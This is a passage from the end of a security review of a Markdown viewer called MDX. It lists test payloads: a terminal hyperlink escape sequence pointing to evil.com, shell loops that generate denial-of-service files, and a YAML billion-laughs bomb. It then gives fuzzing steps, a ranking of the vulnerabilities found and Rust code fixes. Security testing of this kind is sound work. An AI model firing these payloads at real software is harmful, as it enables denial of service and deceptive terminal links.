   # Hyperlink injection
   \x1b]8;;http://evil.com\x07Click here\x1b]8;;\x07
   ```

4. **DoS Tests**
   ```bash
   # Large file
   yes "# Heading" | head -c 10485760 > huge.md
   mdx huge.md

   # Many headings
   for i in {1..100000}; do echo "# Heading $i"; done > many-headings.md
   mdx many-headings.md

   # Many images
   for i in {1..100000}; do echo "![](img$i.png)"; done > many-images.md
   mdx many-images.md
   ```

5. **YAML Bomb Test**
   ```yaml
   # ~/.config/mdx/mdx.yaml
   a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
   b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
   c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
   d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
   ```

### Fuzzing Recommendations

1. **Markdown Fuzzing**
   ```bash
   cargo install cargo-fuzz
   cargo fuzz run markdown_parser
   ```

2. **Config Fuzzing**
   ```bash
   cargo fuzz run yaml_parser
   ```

3. **Image Path Fuzzing**
   ```bash
   cargo fuzz run image_resolver
   ```

---

## Conclusion

The MDX Markdown viewer has **multiple critical security vulnerabilities** when handling untrusted content. The most severe issues are:

1. **Command injection via editor config** (CRITICAL)
2. **Insecure security defaults** (CRITICAL)
3. **Terminal escape sequence injection** (HIGH)
4. **Path traversal in image loading** (HIGH)
5. **Resource exhaustion via malicious markdown** (MEDIUM)

### Risk Assessment

**If used with TRUSTED content only:**
- Risk: LOW
- Recommendation: Enable convenience features (images, git, watch)

**If used with UNTRUSTED content (e.g., from the internet):**
- Risk: HIGH without mitigations
- Recommendation: Use secure configuration, apply all critical fixes

### Immediate Action Items

1. ✅ **Add this check to `launch_editor()`:**
   ```rust
   if config.security.no_exec {
       anyhow::bail!("External editor execution disabled by security policy");
   }
   ```

2. ✅ **Change security defaults:**
   ```rust
   impl Default for SecurityConfig {
       fn default() -> Self {
           Self {
               safe_mode: true,   // Changed from false
               no_exec: true,     // Changed from false
           }
       }
   }
   ```

3. ✅ **Add file size limit:**
   ```rust
   const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10MB
   let metadata = fs::metadata(&abs_path)?;
   if metadata.len() > MAX_FILE_SIZE {
       anyhow::bail!("File too large");
   }
   ```

These three changes alone would eliminate the most critical attack vectors.

---

## References

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **CWE-78: OS Command Injection**: https://cwe.mitre.org/data/definitions/78.html
- **CWE-22: Path Traversal**: https://cwe.mitre.org/data/definitions/22.html
- **CWE-91: XML Injection** (similar to YAML): https://cwe.mitre.org/data/definitions/91.html
- **Terminal Escape Sequence Injection**: https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#terminal-escape-sequences
- **Rust Security Guidelines**: https://anssi-fr.github.io/rust-guide/

---

**End of Security Review**

Generated: 2025-12-29
Classification: CONFIDENTIAL
Distribution: Development Team Only
